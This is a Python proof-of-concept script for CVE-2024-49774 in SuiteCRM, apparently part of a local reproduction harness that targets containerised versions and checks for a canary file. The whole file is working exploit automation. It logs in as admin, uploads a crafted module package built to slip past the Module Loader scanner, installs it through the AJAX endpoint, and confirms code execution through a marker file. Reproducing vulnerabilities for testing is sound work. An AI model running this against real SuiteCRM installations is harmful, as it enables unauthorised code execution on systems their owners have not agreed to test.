#!/usr/bin/env python3
"""original_poc.py -- CVE-2024-49774: ModuleScanner bypass via quoted-string callable.

Uploads a crafted Module Loader Package whose PHP uses T_CONSTANT_ENCAPSED_STRING
('file_get_contents' as a quoted string callable) to evade the pre-8.7.1 scanner.

Expected: installs + canary surfaces on V0 (7.14.5); blocked by scanner on V1 (7.15.0+).
"""
import os
import re
import sys
import time
import requests

CASE_DIR = os.path.dirname(os.path.abspath(__file__))
MODULE_ZIP = os.path.join(CASE_DIR, "original_module.zip")

PORTS = {"v0": 39140, "v1": 39141, "v2": 39142}
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!"
MODULE_NAME = "PCBOriginal"
MARKER_FILE = "pcb_marker_original.txt"


def get_base_url(version: str) -> str:
    return f"http://127.0.0.1:{PORTS[version]}"


def login(session: requests.Session, base_url: str) -> bool:
    """Log into SuiteCRM."""
    session.get(f"{base_url}/index.php?module=Users&action=Login", timeout=30)
    r = session.post(f"{base_url}/index.php", data={
        "module": "Users", "action": "Authenticate",
        "user_name": ADMIN_USER, "username_password": ADMIN_PASS, "Login": "Log In",
    }, allow_redirects=True, timeout=30)
    # Verify by accessing admin panel
    check = session.get(f"{base_url}/index.php?module=Administration&action=index", timeout=30)
    if "Module Loader" in check.text or "UpgradeWizard" in check.text:
        print(f"[original_poc] Logged in as admin")
        return True
    print(f"[original_poc] Login failed or not admin")
    return False


def upload_and_install(session: requests.Session, base_url: str, zip_path: str, module_name: str) -> dict:
    """Upload + install a module via the Module Loader.

    Uses the SuiteCRM upload + AJAX install flow:
    1. POST upload to UpgradeWizard run=upload
    2. GET Module Loader page to populate session file hashes
    3. POST performInstall via HandleAjaxCall with the hashed file ref
    """
    result = {"uploaded": False, "installed": False, "scanner_blocked": False, "detail": ""}

    # Step 1: Upload
    with open(zip_path, "rb") as f:
        r = session.post(
            f"{base_url}/index.php?module=Administration&view=module&action=UpgradeWizard&run=upload",
            files={"upgrade_zip": (os.path.basename(zip_path), f, "application/zip")},
            data={"run": "upload"},
            allow_redirects=True,
            timeout=60,
        )

    body = r.text.lower()
    if "ml_manifest_issue" in body or "ml_invalid_function" in body:
        result["scanner_blocked"] = True
        result["detail"] = "Scanner blocked at manifest scan"
        return result

    if "uploaded" not in body and "success" not in body:
        # Check for the upload status via JS
        if f"{os.path.basename(zip_path)} has been uploaded" not in r.text:
            result["detail"] = "Upload may have failed"
            return result

    result["uploaded"] = True
    print(f"[original_poc] Module uploaded")

    # Step 2: Visit Module Loader page to populate session file hashes
    list_r = session.get(
        f"{base_url}/index.php?module=Administration&action=UpgradeWizard&view=module",
        timeout=30,
    )

    # Extract file hash for this specific module from mti_data JavaScript array
    data_match = re.findall(r"mti_data\s*=\s*\[(.*?)\];", list_r.text, re.DOTALL)
    file_hash = None
    if data_match:
        # Find the entry for our module by name
        entries = re.findall(r"\[([^\]]+)\]", data_match[0])
        for entry in entries:
            if module_name in entry:
                hashes = re.findall(r"'([a-f0-9]{32})'", entry)
                if hashes:
                    file_hash = hashes[0]
                    break
        # Fallback: first hash
        if not file_hash:
            hashes = re.findall(r"'([a-f0-9]{32})'", data_match[0])
            if hashes:
                file_hash = hashes[0]

    if not file_hash:
        result["detail"] = "Could not find file hash in Module Loader listing"
        return result

    print(f"[original_poc] File hash: {file_hash}")

    # Step 3: Install via AJAX
    r = session.post(
        f"{base_url}/index.php",
        data={
            "entryPoint": "HandleAjaxCall",
            "to_pdf": "1",
            "module": "Administration",
            "action": "HandleAjaxCall",
            "method": "performInstall",
            "file": file_hash,
        },
        timeout=120,
    )

    install_body = r.text.lower()
    if "invalid function" in install_body or "ml_invalid" in install_body or "file issues" in install_body:
        result["scanner_blocked"] = True
        # Extract specific issues
        issues = re.findall(r"(?:Invalid Function|ML_INVALID)[^<]*", r.text, re.IGNORECASE)
        result["detail"] = f"Scanner blocked at install: {'; '.join(issues[:3])}"
        print(f"[original_poc] SCANNER BLOCKED: {result['detail']}")
        return result

    if "success" in install_body:
        result["installed"] = True
        print(f"[original_poc] Module installed successfully")
    else:
        result["detail"] = f"Install result unclear: {r.text[:200]}"

    return result


def check_canary(session: requests.Session, base_url: str) -> str:
    """Check for the marker file written by the post_execute script during install."""
    try:
        r = session.get(f"{base_url}/{MARKER_FILE}", timeout=15)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
    except Exception:
        pass
    return ""


def run(version: str = "v0") -> str:
    """Execute the original PoC. Returns flag content or status string."""
    base_url = get_base_url(version)
    session = requests.Session()
    print(f"[original_poc] Targeting {version} at {base_url}")

    # Wait for app
    for _ in range(60):
        try:
            r = session.get(f"{base_url}/index.php", timeout=10)
            if r.status_code == 200:
                break
        except Exception:
            pass
        time.sleep(5)
    else:
        return "ERROR: app not reachable"

    if not login(session, base_url):
        return "ERROR: login failed"

    result = upload_and_install(session, base_url, MODULE_ZIP, MODULE_NAME)

    if result["scanner_blocked"]:
        return "BLOCKED_BY_SCANNER"
    if not result["installed"]:
        return f"ERROR: {result['detail']}"

    time.sleep(2)
    marker = check_canary(session, base_url)
    return marker if marker else "NO_FLAG_DETECTED"


if __name__ == "__main__":
    version = sys.argv[1] if len(sys.argv) > 1 else "v0"
    print(run(version=version))
